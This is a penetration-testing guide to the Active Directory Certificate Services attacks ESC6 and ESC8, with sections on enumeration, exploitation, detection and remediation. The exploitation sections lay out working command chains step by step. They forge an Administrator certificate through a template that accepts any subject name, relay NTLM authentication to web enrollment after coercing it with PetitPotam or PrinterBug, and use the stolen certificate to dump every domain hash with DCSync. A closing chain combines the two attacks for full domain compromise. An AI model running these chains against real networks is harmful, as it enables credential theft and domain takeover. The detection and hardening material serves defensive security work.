# ESC6 & ESC8 - CA Configuration & NTLM Relay Attacks

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

### Attack Overview

ESC6 exploits the legacy `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on the Certificate Authority. When enabled, this flag allows **any user** to specify a Subject Alternative Name (SAN) in their certificate request, regardless of template configuration.

This effectively turns **every enrollable template** into an ESC1-style vulnerability.

---

### Prerequisites

- Domain user credentials
- CA with `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled
- Ability to enroll in at least one template
- Network access to the CA

---

### Vulnerability Conditions

```
✓ CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
✓ At least one template allows enrollment by low-privileged users
✓ Template has Client Authentication EKU (or Any Purpose)
```

---

### Enumeration

#### Using Certify
```powershell
# Check CA configuration
.\Certify.exe cas

# Example vulnerable output:
[*] CA Name: corp-DC01-CA
    DNS Name: DC01.corp.local
    Flags: EDITF_ATTRIBUTESUBJECTALTNAME2  <--- VULNERABLE
    Vulnerabilities: ESC6
```

#### Using Certipy
```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.10.10.10 -stdout | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"
```

#### Manual Check (On CA Server)
```powershell
# Check registry on CA server
certutil -getreg policy\EditFlags

# Output showing vulnerability:
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\corp-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:
EditFlags REG_DWORD = 140040 (1310784)
  EDITF_ENABLEREQUESTEXTENSIONS -- 40 (64)
  EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)  <--- VULNERABLE
```

---

### Exploitation

#### Step 1: Find Enrollable Template
```powershell
# Any template you can enroll in becomes exploitable
.\Certify.exe find /currentuser

# Example output:
[*] Template Name: User
    Template Permissions:
      CORP\Domain Users: Enroll
    Application Policies: Client Authentication

# "User" template is normally safe, but with ESC6 it's vulnerable
```

#### Step 2: Request Certificate with Arbitrary SAN
```powershell
# Request certificate for Administrator using ANY template
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:User /altname:Administrator

# The CA will honor the SAN request due to EDITF_ATTRIBUTESUBJECTALTNAME2
```

**Using certreq (Native Windows Tool):**
```powershell
# Create INF file
$InfContent = @"
[NewRequest]
Subject = "CN=$env:USERNAME"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
RequestType = PKCS10

[RequestAttributes]
SAN="upn=Administrator@corp.local"
CertificateTemplate=User
"@

$InfContent | Out-File request.inf

# Submit request
certreq -new request.inf request.req
certreq -submit -config "DC01.corp.local\corp-DC01-CA" request.req administrator.cer

# Export with private key
certutil -exportPFX my <serial> administrator.pfx
```

#### Step 3: Authenticate
```powershell
# Use Rubeus
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /password:password /ptt

# Verify access
whoami /groups
klist
```

---

### Detection - ESC6

#### Event Logs
```xml
EventID: 4886 (Certificate Request)
Look for:
  - Request Attributes containing "SAN=" or "upn="
  - Requester different from SAN value
  - Templates normally safe (User, Computer, etc.)
```

#### Detection Queries

**Splunk:**
```spl
index=windows EventCode=4886
| rex field=Message "Request Attributes:\s+(?<Attributes>[^\n]+)"
| where match(Attributes, "SAN=|upn=")
| rex field=Message "Requester:\s+(?<Requester>[^\n]+)"
| rex field=Attributes "upn=(?<SANValue>[^;\s]+)"
| where Requester != SANValue
| table _time, Requester, SANValue, Computer
```

---

### Remediation - ESC6

#### Immediate Action - Disable Flag

**On CA Server:**
```powershell
# Disable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "DC01.corp.local\corp-DC01-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Restart Certificate Services
Restart-Service CertSvc
```

#### Verify Fix
```powershell
certutil -getreg policy\EditFlags

# Should NOT show EDITF_ATTRIBUTESUBJECTALTNAME2
```

#### Alternative - Selective Enforcement

If you need SAN specification for specific templates:

```powershell
# Disable global flag
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Enable ENROLLEE_SUPPLIES_SUBJECT on specific templates only
# Via Certificate Templates Console (certtmpl.msc)
```

---

## ESC8 - NTLM Relay to AD CS HTTP Endpoints

### Attack Overview

ESC8 exploits **NTLM relay** to AD CS web enrollment endpoints. Many AD CS installations expose HTTP-based enrollment interfaces:
- Web Enrollment (`/certsrv/`)
- Certificate Enrollment Service (CES)
- Network Device Enrollment Service (NDES)

If these endpoints:
1. Accept NTLM authentication
2. Don't require HTTPS or have weak channel binding
3. Don't have EPA (Extended Protection for Authentication)

An attacker can relay NTLM authentication to request certificates on behalf of victims.

---

### Prerequisites

- Network position to perform NTLM relay (ARP spoofing, LLMNR/NBT-NS poisoning, etc.)
- AD CS web enrollment endpoint accessible
- Victim authentication that can be relayed
- HTTP endpoint OR HTTPS without EPA/channel binding

---

### Vulnerability Conditions

```
✓ AD CS Web Enrollment enabled
✓ HTTP endpoint exposed OR HTTPS without EPA
✓ Certificate template allows domain authentication
✓ Ability to coerce or capture authentication
```

---

### Enumeration

#### Find Web Enrollment Endpoints
```powershell
# Port scan for common ports
nmap -p 80,443 -sV <CA-server>

# Check for web enrollment
curl http://ca-server/certsrv/
curl https://ca-server/certsrv/

# Using Certify
.\Certify.exe find /enrollmentendpoints
```

#### Check for EPA/Channel Binding
```powershell
# On CA server - check IIS configuration
Import-Module WebAdministration
Get-WebConfigurationProperty -Filter "system.webServer/security/authentication/windowsAuthentication" -Name extendedProtection -PSPath "IIS:\Sites\Default Web Site\CertSrv"

# If extendedProtection is "None" or not configured - VULNERABLE
```

---

### Exploitation

#### Attack Setup

**Required Tools:**
- **ntlmrelayx** (Impacket) - For NTLM relay
- **Responder** or **Inveigh** - For capturing NTLM authentication
- **Certipy** - For certificate-based authentication

---

#### Scenario 1: HTTP Web Enrollment Relay

**Step 1: Setup ntlmrelayx**
```bash
# Start ntlmrelayx targeting CA web enrollment
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Alternative for user certificate
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template User
```

**Step 2: Coerce Authentication**

Using **PetitPotam** (coerce machine authentication):
```bash
python3 PetitPotam.py -d corp.local -u user -p password <attacker-ip> <target-dc>
```

Using **PrinterBug**:
```powershell
.\SpoolSample.exe <target-dc> <attacker-ip>
```

Using **PrivExchange** (coerce Exchange server):
```python
python privexchange.py -d corp.local -u user -p password -ah <attacker-ip> <exchange-server>
```

**Step 3: Capture Relayed Certificate**

ntlmrelayx will automatically:
1. Relay the authentication
2. Request certificate on behalf of victim
3. Save the certificate

```
[*] HTTPD: Received connection from 10.10.10.100
[*] Authenticating against http://ca-server/certsrv/certfnsh.asp as CORP\DC01$
[*] HTTPD: Client requested path: /
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user DC01$:
    MIIRdQIBAzCCE...
```

**Step 4: Use Certificate for Authentication**
```bash
# Use Certipy to authenticate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10

# Retrieve TGT and NTLM hash
[*] Got hash for 'DC01$@CORP.LOCAL': aad3b435b51404eeaad3b435b51404ee:8a4c01...
```

**Step 5: DCSync or Escalate**
```bash
# Use machine account hash for DCSync
secretsdump.py -just-dc-ntlm 'CORP/DC01$@dc01.corp.local' -hashes :8a4c01...

# Get all domain hashes
```

---

#### Scenario 2: HTTPS Web Enrollment (Weak Channel Binding)

```bash
# Relay to HTTPS endpoint if EPA is disabled
ntlmrelayx.py -t https://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Same coercion techniques apply
```

---

#### Scenario 3: Web Enrollment + Shadow Credentials

**Chain with Shadow Credentials attack:**
```bash
# 1. Relay to get certificate for computer account
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp --adcs --template Machine

# 2. Authenticate as computer account
certipy auth -pfx computer.pfx -dc-ip 10.10.10.10

# 3. Use computer account to modify user's msDS-KeyCredentialLink (Shadow Credentials)
python3 pywhisker.py -d corp.local -u 'COMPUTER$' -H <hash> --target Administrator --action add

# 4. Authenticate as Administrator
```

---

### Detection - ESC8

#### Network Detection

**Monitor for:**
- SMB connections followed immediately by HTTP/HTTPS connections to CA
- Multiple failed then successful authentication from same IP
- Authentication to CA from unexpected sources

**Wireshark Filter:**
```
ntlmssp && (http || ssl)
```

#### Event Logs

**On CA Server - IIS Logs:**
```
C:\inetpub\logs\LogFiles\W3SVC1\

Look for:
- Rapid successful authentication (200 OK)
- Certificate requests from computer accounts
- Requests from unusual IPs/hostnames
```

**Security Event 4768** - TGT Request with Certificate:
```xml
EventID: 4768
Pre-Authentication Type: Public Key (16)
Account Name: Machine accounts (DC01$, EXCHANGE$)
Look for: Unusual computer account authentications
```

---

#### Detection Queries

**Splunk - Detect Relay Pattern:**
```spl
index=windows EventCode=4624
| where LogonType=3 AND AuthenticationPackageName="NTLM"
| stats count by src_ip, user, _time
| where count > 5
| join src_ip [search index=iis cs_uri_stem="/certsrv/*"]
```

---

### Remediation - ESC8

#### Immediate Actions

1. **Disable HTTP Web Enrollment**
```powershell
# On CA server - Disable HTTP bindings
Remove-WebBinding -Name "Default Web Site" -Protocol http -Port 80

# Keep only HTTPS
Get-WebBinding -Name "Default Web Site"
```

2. **Enable Extended Protection for Authentication (EPA)**
```powershell
# On CA server
Import-Module WebAdministration

# Enable EPA for CertSrv
Set-WebConfigurationProperty -Filter "system.webServer/security/authentication/windowsAuthentication" -Name extendedProtection.tokenChecking -Value "Require" -PSPath "IIS:\Sites\Default Web Site\CertSrv"

# Restart IIS
iisreset /restart
```

3. **Enable Channel Binding**
```powershell
Set-WebConfigurationProperty -Filter "system.webServer/security/authentication/windowsAuthentication" -Name extendedProtection.flags -Value "Proxy,NoServiceNameCheck" -PSPath "IIS:\Sites\Default Web Site\CertSrv"
```

4. **Require HTTPS Only**
```powershell
# In IIS Manager:
# CertSrv → SSL Settings
# ☑ Require SSL
# ☑ Require 128-bit SSL
```

---

#### Long-Term Hardening

**1. Network Segmentation**
```
- Place CA servers in dedicated VLAN
- Firewall rules: Allow CA access only from specific subnets
- Block SMB from CA to other networks
```

**2. Disable NTLM (Prefer Kerberos)**
```powershell
# Group Policy:
# Computer Configuration → Windows Settings → Security Settings
# → Local Policies → Security Options
# "Network security: LAN Manager authentication level"
# Set to: "Send NTLMv2 response only. Refuse LM & NTLM"

# Or disable NTLM completely for CA server
```

**3. SMB Signing Enforcement**
```powershell
# Prevent NTLM relay via SMB
# Group Policy → Computer Configuration → Policies
# → Windows Settings → Security Settings → Local Policies
# → Security Options
# "Microsoft network server: Digitally sign communications (always)" = Enabled
```

**4. LDAP Signing & Channel Binding**
```powershell
# On Domain Controllers
# Prevents LDAP relay chains
reg add "HKLM\System\CurrentControlSet\Services\NTDS\Parameters" /v "LDAPServerIntegrity" /t REG_DWORD /d 2 /f
reg add "HKLM\System\CurrentControlSet\Services\NTDS\Parameters" /v "LdapEnforceChannelBinding" /t REG_DWORD /d 2 /f
```

---

### Prevention Best Practices

**Web Enrollment Security Checklist:**

- [ ] HTTPS only (HTTP disabled)
- [ ] Extended Protection for Authentication (EPA) enabled
- [ ] Channel binding configured
- [ ] Certificate-based authentication preferred
- [ ] Network segmentation implemented
- [ ] SMB signing enforced
- [ ] NTLM disabled or restricted
- [ ] Monitoring for relay patterns

---

## Combined ESC6 + ESC8 Attack

**Maximum Impact Scenario:**

```bash
# 1. Identify ESC6-vulnerable CA with HTTP web enrollment
certipy find -u user@corp.local -p Password123 -dc-ip 10.10.10.10 -vulnerable

# 2. Setup ntlmrelayx with custom template using ANY enrollable template
#    (ESC6 allows SAN specification regardless of template)
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp --adcs --template User --add-san "Administrator@corp.local"

# 3. Coerce DC authentication
python3 PetitPotam.py <attacker-ip> <dc-ip>

# 4. Receive certificate for Administrator
# 5. Full domain compromise
```

---

## Tools Reference

### ESC6
- Certify.exe
- Certipy
- certreq (built-in)

### ESC8
- ntlmrelayx (Impacket)
- Responder
- PetitPotam
- PrinterBug
- Certipy

---

## References

- [SpecterOps - Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [ESC8 - NTLM Relay to ADCS HTTP Endpoints](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Microsoft - Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811)

---

**Author**: ADCS Attack Research
**Last Updated**: November 2025
**Classification**: Authorized Security Testing Only
